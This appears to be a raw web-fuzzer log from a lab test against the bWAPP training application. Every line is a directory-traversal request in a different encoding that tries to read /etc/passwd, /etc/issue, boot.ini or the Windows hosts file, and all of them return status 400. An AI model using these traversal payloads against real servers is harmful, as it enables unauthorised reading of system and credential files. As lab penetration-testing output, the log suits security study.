7759,400,10L,42W,http://10.0.2.4/bWAPP/..../%%32%%66..../%%32%%66boot.ini
7734,400,10L,42W,http://10.0.2.4/bWAPP/..../%uF025..../%uF025etc%uF025issue
7733,400,10L,42W,http://10.0.2.4/bWAPP/..../%uF025..../%uF025etc%uF025passwd
7664,400,10L,42W,http://10.0.2.4/bWAPP/..../%u2215..../%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
7665,400,10L,42W,http://10.0.2.4/bWAPP/..../%u2215..../%u2215..../%u2215etc%u2215passwd
7648,400,10L,42W,http://10.0.2.4/bWAPP/..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
7652,400,10L,42W,http://10.0.2.4/bWAPP/..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
7675,400,10L,42W,http://10.0.2.4/bWAPP/..../%u2215..../%u2215..../%u2215..../%u2215..../%u2215boot.ini
7694,400,10L,42W,http://10.0.2.4/bWAPP/..../%u2216..../%u2216..../%u2216..../%u2216etc%u2216issue
7722,400,10L,42W,http://10.0.2.4/bWAPP/..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8etc%uEFC8issue
7539,400,10L,42W,http://10.0.2.4/bWAPP/..../%c0%qfboot.ini
7925,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/etc/passwd
7929,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/etc/passwd
7930,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/etc/issue
7554,400,10L,42W,http://10.0.2.4/bWAPP/..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qfetc%c0%qfissue
7927,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/boot.ini
7932,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
7926,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/etc/issue
7933,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
7934,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue
7937,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
7931,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/boot.ini
7936,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
7935,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
7939,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
7942,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue
7943,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
7941,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
7944,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
7940,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
7938,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue
7555,400,10L,42W,http://10.0.2.4/bWAPP/..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qfboot.ini
7553,400,10L,42W,http://10.0.2.4/bWAPP/..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qf..../%c0%qfetc%c0%qfpasswd
7677,400,10L,42W,http://10.0.2.4/bWAPP/..../%u2215..../%u2215..../%u2215..../%u2215..../%u2215..../%u2215etc%u2215passwd
7542,400,10L,42W,http://10.0.2.4/bWAPP/..../%c0%qf..../%c0%qfetc%c0%qfissue
7573,400,10L,42W,http://10.0.2.4/bWAPP/..../%c1%8s..../%c1%8s..../%c1%8s..../%c1%8setc%c1%8spasswd
7564,400,10L,42W,http://10.0.2.4/bWAPP/..../%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
7928,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
8210,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pcetc%c1%pcissue
8209,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pcetc%c1%pcpasswd
8211,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pcboot.ini
8212,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8213,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcpasswd
8214,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue
8215,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pcboot.ini
8216,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8218,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue
8221,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcpasswd
8220,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8219,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcboot.ini
8217,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcpasswd
8223,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcboot.ini
8226,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue
8224,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8225,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcpasswd
8228,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8227,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcboot.ini
8222,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue
8229,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcpasswd
8231,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcboot.ini
8230,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue
8232,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
8234,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9vetc%c0%9vissue
8247,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vboot.ini
8242,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vissue
8241,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vpasswd
8233,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9vetc%c0%9vpasswd
8239,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9vboot.ini
8237,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vpasswd
8238,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vissue
8236,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
8235,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9vboot.ini
8240,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
8249,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vpasswd
8255,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vboot.ini
8256,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
8259,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qfboot.ini
8250,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vissue
8248,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
8257,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qfetc%c0%qfpasswd
8258,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qfetc%c0%qfissue
8254,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vissue
8265,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfpasswd
8261,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfpasswd
8262,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfissue
8264,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8263,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qfboot.ini
8270,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfissue
8272,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8260,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8253,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vpasswd
8276,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8274,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfissue
8275,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfboot.ini
8271,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfboot.ini
8277,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfpasswd
8281,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8setc%c1%8spasswd
8273,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfpasswd
8279,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfboot.ini
8285,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8spasswd
8282,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8setc%c1%8sissue
8286,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8sissue
8283,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8sboot.ini
8287,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8sboot.ini
8288,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8290,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8sissue
8284,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8296,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8294,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8sissue
8303,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8sboot.ini
8295,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8sboot.ini
8299,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8sboot.ini
8278,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfissue
8304,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8297,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8spasswd
8301,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8spasswd
8298,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8sissue
8289,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8spasswd
8300,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8292,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
8353,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qfetc%bg%qfpasswd
8355,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qfboot.ini
8354,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qfetc%bg%qfissue
8293,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8spasswd
8280,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8302,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8s%2e%2e%c1%8setc%c1%8sissue
8356,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
8357,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfpasswd
8358,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfissue
8359,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qfboot.ini
8269,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfpasswd
8243,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vboot.ini
8244,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
8268,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
8365,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfpasswd
8366,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfissue
8369,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfpasswd
8360,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
8246,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9v%2e%2e%c0%9vetc%c0%9vissue
8368,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
8373,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfpasswd
8361,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfpasswd
8382,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215etc%u2215issue
8375,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfboot.ini
8363,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfboot.ini
8377,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215etc%u2215passwd
8379,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215boot.ini
8362,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfetc%bg%qfissue
8381,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215etc%u2215passwd
8378,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215etc%u2215issue
8388,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
8389,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd
8376,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qf%2e%2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
8390,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215issue
8392,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
8383,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215boot.ini
8397,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd
8402,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216etc%u2216issue
8393,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd
8404,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
8403,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216boot.ini
8405,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216etc%u2216passwd
8401,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216etc%u2216passwd
8395,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215boot.ini
8400,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
8384,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2215%2e%2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
8416,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
8417,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216etc%u2216passwd
8415,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216boot.ini
8408,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
8407,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216boot.ini
8411,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216boot.ini
8409,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216etc%u2216passwd
8410,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216etc%u2216issue
8406,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216etc%u2216issue
8414,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216etc%u2216issue
8419,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216boot.ini
8431,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%uEFC8%2e%2e%uEFC8boot.ini
8425,400,10L,42W,http://10.0.2.4/bWAPP/%2e%2e%uEFC8etc%uEFC8passwd
